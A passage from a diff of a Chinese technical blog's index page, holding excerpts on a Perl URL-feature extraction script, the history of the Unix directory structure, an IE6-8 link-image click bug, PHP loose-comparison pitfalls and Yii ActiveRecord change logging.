class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">my $len;</span><br><span class="line">my $hassuffix1 = 0;</span><br><span class="line">my $hassuffix2 = 0;</span><br><span class="line">my $suffixstr;</span><br><span class="line">my $laststr1 = $array1\[$path1 - 1\];</span><br><span class="line">my $laststr2 = $array2\[$path2 - 1\];</span><br><span class="line">my $issuffixsame = 0;</span><br><span class="line">if( $lastispath1 == 0 )</span><br><span class="line">&#123;</span><br><span class="line">	my @suffix1 = split( /\\./, $array1\[$path1 - 1\]);</span><br><span class="line">	if( @suffix1 &amp;gt;= 2 )</span><br><span class="line">	&#123;</span><br><span class="line"><span class="meta">		$</span><span class="bash">len = rindex( <span class="variable">$suffix1</span>\[@suffix1 - 1\].<span class="string">"\\$"</span>, <span class="string">"\\$"</span>);</span></span><br><span class="line">		if( $len &amp;lt;= 5 )</span><br><span class="line">		&#123;</span><br><span class="line"><span class="meta">			$</span><span class="bash">hassuffix1 = 1;</span></span><br><span class="line"><span class="meta">			$</span><span class="bash">suffixstr = <span class="variable">$suffix1</span>\[@suffix1 - 1\];</span></span><br><span class="line">			my $tmplen = rindex( $array1\[@array1 - 1\]."\\$", "\\$");</span><br><span class="line"><span class="meta">			$</span><span class="bash">laststr1 = substr( <span class="variable">$array1</span>\[@array1 - 1\], 0, <span class="variable">$tmplen</span>-<span class="variable">$len</span>-1 );</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">if( $lastispath2 == 0 )</span><br><span class="line">&#123;</span><br><span class="line">	my @suffix2 = split( /\\./, $array2\[$path2 - 1\]);</span><br><span class="line">	if( @suffix2 &amp;gt;= 2 )</span><br><span class="line">	&#123;</span><br><span class="line"><span class="meta">		$</span><span class="bash">len = rindex( <span class="variable">$suffix2</span>\[@suffix2 - 1\].<span class="string">"\\$"</span>, <span class="string">"\\$"</span>);</span></span><br><span class="line">		if( $len &amp;lt;= 5 )</span><br><span class="line">		&#123;</span><br><span class="line"><span class="meta">			$</span><span class="bash">hassuffix2 = 1;</span></span><br><span class="line"><span class="meta">			if($</span><span class="bash">suffixstr eq <span class="variable">$suffix2</span>\[@suffix2 - 1\])</span></span><br><span class="line">			&#123;</span><br><span class="line">				$issuffixsame = 1;</span><br><span class="line">			&#125;</span><br><span class="line">			my $tmplen = rindex( $array2\[@array2 - 1\]."\\$", "\\$");</span><br><span class="line"><span class="meta">			$</span><span class="bash">laststr2 = substr( <span class="variable">$array2</span>\[@array2 - 1\], 0, <span class="variable">$tmplen</span>-<span class="variable">$len</span>-1 );</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>#特征3：最后一级几个分隔符(通过特征匹配计算laststr1和laststr2相似度，如果仅计算字符串相似度，可以用编辑长度)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">my @area1 = split(/-/, $laststr1);</span><br><span class="line">my @area2 = split(/-/, $laststr2);</span><br><span class="line">my $i;</span><br><span class="line">my $j;</span><br><span class="line">my $totalarea1=0;</span><br><span class="line">my $totalarea2=0;</span><br><span class="line">my @patternarray1=&#123;0&#125;;</span><br><span class="line">my @patternarray2=&#123;0&#125;;</span><br><span class="line">my @splitarray1=&#123;0&#125;;</span><br><span class="line">my @splitarray2=&#123;0&#125;;</span><br><span class="line">#my $numarea1 = @area2;</span><br><span class="line">#print $laststr1,&quot; &quot;,$laststr2,&quot;\\n&quot;,$numarea1,&quot;\\n&quot;;</span><br><span class="line">for ( $i = 1; $i&amp;lt;=@area1; $i++ )</span><br><span class="line">&#123;</span><br><span class="line">	my @tmp1 = split( /_/, $area1\[$i-1\]);</span><br><span class="line">	for( $j = 0; $j&amp;lt;@tmp1; $j++)</span><br><span class="line">	&#123;</span><br><span class="line">		if( $tmp1\[$j\] =~ /^\\d+$/ )</span><br><span class="line">		&#123;</span><br><span class="line">			$patternarray1\[$totalarea1\] = 1; #数字pattern</span><br><span class="line">		&#125;</span><br><span class="line">		elsif( $tmp1\[$j\] =~ /^\[a-zA-Z\]+$/)</span><br><span class="line">		&#123;</span><br><span class="line">			$patternarray1\[$totalarea1\] = 2; #纯字母pattern</span><br><span class="line">		&#125;</span><br><span class="line">		elsif( $tmp1\[$j\] =~ /^\[a-zA-Z\]+\[0-9\]+$/)</span><br><span class="line">		&#123;</span><br><span class="line">			$patternarray1\[$totalarea1\] = 3; #先字母后数字pattern</span><br><span class="line">		&#125;</span><br><span class="line">		elsif( $tmp1\[$j\] =~ /^\[0-9\]+\[a-zA-Z\]+$/)</span><br><span class="line">		&#123;</span><br><span class="line">			$patternarray1\[$totalarea1\] = 4; #先数字后字母pattern</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			$patternarray1\[$totalarea1\] = 5; #其他pattern</span><br><span class="line">		&#125;</span><br><span class="line">		if( $j == 0 )</span><br><span class="line">		&#123;</span><br><span class="line">			$splitarray1\[$totalarea1\]=1;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			$splitarray1\[$totalarea1\]=2;</span><br><span class="line">		&#125;</span><br><span class="line">		$totalarea1 ++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">for ( $i = 1; $i&amp;lt;=@area2; $i++ )</span><br><span class="line">&#123;</span><br><span class="line">	my @tmp2 = split( /_/, $area2\[$i-1\]);</span><br><span class="line">	for( $j = 0; $j&amp;lt;@tmp2; $j++)</span><br><span class="line">	&#123;</span><br><span class="line">		if( $tmp2\[$j\] =~ /^\\d+$/ )</span><br><span class="line">		&#123;</span><br><span class="line">			$patternarray2\[$totalarea2\] = 1; #数字pattern</span><br><span class="line">		&#125;</span><br><span class="line">		elsif( $tmp2\[$j\] =~ /^\[a-zA-Z\]+$/)</span><br><span class="line">		&#123;</span><br><span class="line">			$patternarray2\[$totalarea2\] = 2; #纯字母pattern</span><br><span class="line">		&#125;</span><br><span class="line">		elsif( $tmp2\[$j\] =~ /^\[a-zA-Z\]+\[0-9\]+$/)</span><br><span class="line">		&#123;</span><br><span class="line">			$patternarray2\[$totalarea2\] = 3; #先字母后数字pattern</span><br><span class="line">		&#125;</span><br><span class="line">		elsif( $tmp2\[$j\] =~ /^\[0-9\]+\[a-zA-Z\]+$/)</span><br><span class="line">		&#123;</span><br><span class="line">			$patternarray2\[$totalarea2\] = 4; #先数字后字母pattern</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			$patternarray2\[$totalarea2\] = 5; #其他pattern</span><br><span class="line">		&#125;</span><br><span class="line">		if( $j == 0 )</span><br><span class="line">		&#123;</span><br><span class="line">			$splitarray2\[$totalarea2\]=1;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			$splitarray2\[$totalarea2\]=2;</span><br><span class="line">		&#125;</span><br><span class="line">		$totalarea2 ++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">print $path1,&quot; &quot;,$lastispath1,&quot; &quot;,$hassuffix1,&quot; &quot;,$issuffixsame,&quot; &quot;,$totalarea1;</span><br><span class="line">for( $i = 0; $i&amp;lt;$totalarea1; $i++)</span><br><span class="line">&#123;</span><br><span class="line">	print &quot; &quot;,$splitarray1\[$i\],&quot; &quot;,$patternarray1\[$i\];</span><br><span class="line">&#125;</span><br><span class="line">print &quot;\\n&quot;;</span><br><span class="line">print $path2,&quot; &quot;,$lastispath2,&quot; &quot;,$hassuffix1,&quot; &quot;,$issuffixsame,&quot; &quot;,$totalarea2;</span><br><span class="line">for( $i = 0; $i&amp;lt;$totalarea2; $i++)</span><br><span class="line">&#123;</span><br><span class="line">	print &quot; &quot;,$splitarray2\[$i\],&quot; &quot;,$patternarray2\[$i\];</span><br><span class="line">&#125;</span><br><span class="line">print &quot;\\n&quot;;</span><br><span class="line">#print @array1;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/the-origin-of-the-Unix-directory-structure/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/the-origin-of-the-Unix-directory-structure/" class="post-title-link" itemprop="url">Unix目录结构的来历</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-07-15 00:53:10" itemprop="dateCreated datePublished" datetime="2014-07-15T00:53:10+08:00">2014-07-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-15 10:38:09" itemprop="dateModified" datetime="2025-04-15T10:38:09+08:00">2025-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index">
+                    <span itemprop="name">计算机系统</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Unix（包含Linux）的初学者，常常会很困惑，不明白目录结构的含义何在。 <a href="http://storage.veitor.net/uploads/2014/07/bg2012020601.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/07/bg2012020601.jpg" alt="bg2012020601"></a> 举例来说，根目录下面有一个子目录/bin，用于存放二进制程序。但是，/usr子目录下面还有/usr/bin，以及/usr/local/bin，也用于存放二进制程序；某些系统甚至还有/opt/bin。它们有何区别？ 长久以来，我也感到很费解，不明白为什么这样设计。像大多数人一样，我只是根据<a href="http://www.pathname.com/fhs/pub/fhs-2.3.html" target="_blank" rel="noopener">《Unix文件系统结构标准》</a>（Filesystem Hierarchy Standard），死记硬背不同目录的区别。 昨天，我读到了Rob Landley的<a href="http://lists.busybox.net/pipermail/busybox/2010-December/074114.html" target="_blank" rel="noopener">简短解释</a>，这才恍然大悟，原来Unix目录结构是历史造成的。 话说1969年，<a href="http://www.ruanyifeng.com/blog/2009/06/unix_turns_40.html" target="_blank" rel="noopener">Ken Thompson</a>和<a href="http://www.ruanyifeng.com/blog/2011/10/dennis_ritchie.html" target="_blank" rel="noopener">Dennis Ritchie</a>在小型机PDP-7上发明了Unix。1971年，他们将主机升级到了PDP-11。 <a href="http://storage.veitor.net/uploads/2014/07/bg2012020602.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/07/bg2012020602.jpg" alt="bg2012020602"></a>当时，他们使用一种叫做RK05的储存盘，一盘的容量大约是1.5MB。 <a href="http://storage.veitor.net/uploads/2014/07/bg2012020603.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/07/bg2012020603.jpg" alt="bg2012020603"></a> 没过多久，操作系统（根目录）变得越来越大，一块盘已经装不下了。于是，他们加上了第二盘RK05，并且规定第一块盘专门放系统程序，第二块盘专门 放用户自己的程序，因此挂载的目录点取名为/usr。也就是说，根目录”/“挂载在第一块盘，”/usr”目录挂载在第二块盘。除此之外，两块盘的目录结 构完全相同，第一块盘的目录（/bin, /sbin, /lib, /tmp…）都在/usr目录下重新出现一次。 后来，第二块盘也满了，他们只好又加了第三盘RK05，挂载的目录点取名为/home，并且规定/usr用于存放用户的程序，/home用于存放用户的数据。 从此，这种目录结构就延续了下来。随着硬盘容量越来越大，各个目录的含义进一步得到明确。 <strong>/</strong>：存放系统程序，也就是At&amp;t开发的Unix程序。 <strong>/usr</strong>：存放Unix系统商（比如IBM和HP）开发的程序。 <strong>/usr/local</strong>：存放用户自己安装的程序。 <strong>/opt</strong>：在某些系统，用于存放第三方厂商开发的程序，所以取名为option，意为”选装”。 （完）</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/problem-of-link-pictures-under-IE678/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/problem-of-link-pictures-under-IE678/" class="post-title-link" itemprop="url">IE678下链接图片点不中问题讨论</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-06-26 07:01:17" itemprop="dateCreated datePublished" datetime="2014-06-26T07:01:17+08:00">2014-06-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-15 10:38:09" itemprop="dateModified" datetime="2025-04-15T10:38:09+08:00">2025-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JS/" itemprop="url" rel="index">
+                    <span itemprop="name">JS</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><a href="http://storage.veitor.net/uploads/2014/06/QQ截图20140626150002.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/06/QQ%E6%88%AA%E5%9B%BE20140626150002.jpg" alt="QQ截图20140626150002"></a>因为今天制作的房产项目中出现了图片链接无法点击问题，重新审视了一下块集元素和内联元素，不是混淆，而是重新想了一下新的东西，有时候在我们进行重构的时候，偶尔会为了实际需要而将内联元素强制显示为块集元素，在一般情况下，这个是不会出问题的，而且可以很轻松的通过标准，但是在某一些情况下，虽然验证工具可以放过我们，但是在ie678下面会出现解析不正确的问题，下面就简单跟大家分享一下这个问题。 有时候由于需要文字和图片同时获取到点击态，或者需要实现一些高难度的效果，就需要多标签来写结构，可能的结构会如下所示： <div class="block"> <a href="http://www.hualongxiang.com" target="_blank" rel="noopener"><span><img src="http://static.hualongxiang.com/logo/logo.jpg" alt="hlx" /></span></a> </div> 在没有被赋予强大的CSS的时候，是可以正常点击的，但是当赋予需要的CSS的时候，在ie8一下就会出现图片区域点击不到的情况： .block span{float:left;} 如果将span标签块集化： .block span{float:left;dispaly:block;width:100px;height:100px;} 最终的结果依然不是不能点击到，但是图片区域以为的内容确可以正常点击。 而对于此，我的理解是这样的： 因为a标签本身就是一个内联元素标签，内联标签内正常情况只允许放置内联元素，放置块集元素本身语法就有问题，虽然表面上放置的span标签，但是我们又将其强制块集化，在某些浏览器下还是会解析错误，比如说ie6/7，所以这里针对链接的这种情况，出现的问题就是图片区域无法点击。 针对这种问题的解决方法： 保证在a标签中不要放置块集元素，或者强制块集元素，如果需要解决一些特殊效果，可以采取将这个强制元素跟a内置的img标签同级放置，这样也可以避免图片点击不到问题。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/using-double-equals-with-caution-in-PHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/using-double-equals-with-caution-in-PHP/" class="post-title-link" itemprop="url">PHP中慎用双等于(==)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-06-24 09:09:37" itemprop="dateCreated datePublished" datetime="2014-06-24T09:09:37+08:00">2014-06-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-15 10:38:09" itemprop="dateModified" datetime="2025-04-15T10:38:09+08:00">2025-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index">
+                    <span itemprop="name">PHP</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>PHP比较运算符出现的频率实在是太高了，尤其是 <code>==</code>、 <code>if(a == b){ // do something }</code></p>
+<p>但是，你真的掌握了 <code>==</code> 了吗？细节很重要！ 来看下面的代码，说出你认为正确的答案 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var_dump(&apos;123fg456&apos;==123);</span><br><span class="line">var_dump(&apos;some string&apos; == 0);</span><br><span class="line">var_dump(123.0 == &apos;123d456&apos;);</span><br><span class="line">var_dump(0 == &quot;a&quot;);</span><br><span class="line">var_dump(&quot;1&quot; == &quot;01&quot;);</span><br><span class="line">var_dump(&quot;1&quot; == &quot;1e0&quot;);</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/using-double-equals-with-caution-in-PHP/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/log-mechanism-in-Yii1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/log-mechanism-in-Yii1/" class="post-title-link" itemprop="url">了解Yii中Log日志机制</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-05-27 05:38:20" itemprop="dateCreated datePublished" datetime="2014-05-27T05:38:20+08:00">2014-05-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-15 10:38:09" itemprop="dateModified" datetime="2025-04-15T10:38:09+08:00">2025-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index">
+                    <span itemprop="name">PHP</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>想要知道用户在你的程序中做了些什么，我们可以通过用日志的形式记录下来，前提是用户是做的跟数据库有关的操作。我们可以在任何时候进行的增删改操作都可以记录下来，对于Yii中的AR模型我们可以使用behavior（行为）来达到此目的，这样很容易的就可以把日志功能加到AR类里。 首先我们需要建一张日志表：</p>
+<p>CREATE TABLE ActiveRecordLog (<br>  id INTEGER UNSIGNED NOT NULL AUTO_INCREMENT,<br>  description VARCHAR(255) NULL,<br>  action VARCHAR(20) NULL,<br>  model VARCHAR(45) NULL,<br>  idModel INTEGER UNSIGNED NULL,<br>  field VARCHAR(45) NULL,<br>  creationdate TIMESTAMP NOT NULL,<br>  userid VARCHAR(45) NULL,<br>  PRIMARY KEY(id)<br>)<br>TYPE=InnoDB;</p>
+<p>接着我们就需要建立相应的model，可以使用gii或者shell工具等。 为了记录用户操作，我们需要创建一个behavior类，一般放在protected/behavior目录下，该类必须继承CActiveRecordBehavior类。</p>
+<p>class ActiveRecordLogableBehavior extends CActiveRecordBehavior<br>{<br>    private $_oldattributes = array();<br>    /**<br>     * save操作<br>     * @param  [type] $event [description]<br>     * @return [type]        [description]<br>     <em>/<br>    public function afterSave($event)<br>    {<br>        //非新记录，即非插入<br>        if (!$this-&gt;Owner-&gt;isNewRecord) {<br>            $newattributes = $this-&gt;Owner-&gt;getAttributes();             //获得AR类中已修改的各字段值<br>            $oldattributes = $this-&gt;getOldAttributes();                 //之前的旧数据<br>            //比较新旧数据<br>            foreach ($newattributes as $name =&gt; $value) {<br>                if (!empty($oldattributes)) {<br>                    $old = $oldattributes[$name];<br>                } else {<br>                    $old = ‘’;<br>                }<br>                //如果该字段旧数据与新数据不一样，则进行记录<br>                if ($value != $old) {<br>                    //$changes = $name . ‘ (‘.$old.’) =&gt; (‘.$value.’), ‘;<br>                    $log=new ActiveRecordLog;                                               //实例log对象<br>                    $log-&gt;description=  ‘User ‘ . Yii::app()-&gt;user-&gt;Name                    //设置日志内容格式，描述具体操作<br>                                            . ‘ changed ‘ . $name . ‘ for ‘<br>                                            . get_class($this-&gt;Owner)<br>                                            . ‘[‘ . $this-&gt;Owner-&gt;getPrimaryKey() .’].’;<br>                    $log-&gt;action=       ‘CHANGE’;                                           //设置操作类型为“修改”<br>                    $log-&gt;model=        get_class($this-&gt;Owner);<br>                    $log-&gt;idModel=      $this-&gt;Owner-&gt;getPrimaryKey();                      //获得修改的记录的主键<br>                    $log-&gt;field=        $name;                                              //修改的字段名<br>                    $log-&gt;creationdate= new CDbExpression(‘NOW()’);                         //日志生成时间<br>                    $log-&gt;userid=       Yii::app()-&gt;user-&gt;id;                               //记录用户id<br>                    $log-&gt;save();                                                           //保存日至到数据库<br>                }<br>            }<br>        } else {//新纪录直接保存操作日志入库<br>            $log=new ActiveRecordLog;<br>            $log-&gt;description=  ‘User ‘ . Yii::app()-&gt;user-&gt;Name<br>                                    . ‘ created ‘ . get_class($this-&gt;Owner)<br>                                    . ‘[‘ . $this-&gt;Owner-&gt;getPrimaryKey() .’].’;<br>            $log-&gt;action=       ‘CREATE’;<br>            $log-&gt;model=        get_class($this-&gt;Owner);<br>            $log-&gt;idModel=      $this-&gt;Owner-&gt;getPrimaryKey();<br>            $log-&gt;field=        ‘’;<br>            $log-&gt;creationdate= new CDbExpression(‘NOW()’);<br>            $log-&gt;userid=       Yii::app()-&gt;user-&gt;id;<br>            $log-&gt;save();<br>        }<br>    }<br>    /*\</em><br>     * 删除操作<br>     * @param  [type] $event [description]<br>     * @return [type]        [description]<br>     */<br>    public function afterDelete($event)<br>    {<br>        $log=new ActiveRecordLog;<br>        $log-&gt;description=  ‘User ‘ . Yii::app()-&gt;user-&gt;Name . ‘ deleted ‘<br>                                . get_class($this-&gt;Owner)<br>                                . ‘[‘ . $this-&gt;Owner-&gt;getPrimaryKey() .’].’;<br>        $log-&gt;action=       ‘DELETE’;<br>        $log-&gt;model=        get_class($this-&gt;Owner);<br>        $log-&gt;idModel=      $this-&gt;Owner-&gt;getPrimaryKey();<br>        $log-&gt;field=        ‘’;<br>        $log-&gt;creationdate= new CDbExpression(‘NOW()’);<br>        $log-&gt;userid=       Yii::app()-&gt;user-&gt;id;<br>        $log-&gt;save();<br>    }<br>    public function afterFind($event)<br>    {<br>        //保存查询出来的数据<br>        $this-&gt;setOldAttributes($this-&gt;Owner-&gt;getAttributes());<br>    }<br>    public function getOldAttributes()<br>    {<br>        return $this-&gt;_oldattributes;<br>    }<br>    public function setOldAttributes($value)<br>    {<br>        $this-&gt;_oldattributes=$value;<br>    }<br>}</p>
+<p>该behavior行为类中需要使用到ActiveRecordLo类来将日志记录到数据库中，它会为为每次插入、删除记录一条日志，也会为修改的每个字段记录一条日志。 设定的行为已经写好了，那么剩下的就是需要将其绑定到对应的model模型上。我们只需在对应的model里加入以下方法就完成绑定了：</p>
+<p>public function behaviors()<br>{<br>    return array(<br>        // 行为类名 =&gt; 类文件别名路径<br>        ‘ActiveRecordLogableBehavior’=&gt;<br>            ‘application.behaviors.ActiveRecordLogableBehavior’,<br>    );<br>}</p>
+<p>  当然这些都是最基本的简单的记录日志操作，你还可以进行扩展，以满足更高级更多功能的需求。如有问题，留言探讨~</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/the-difference-between-addSearchCondition-and-compare-in-Yii/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
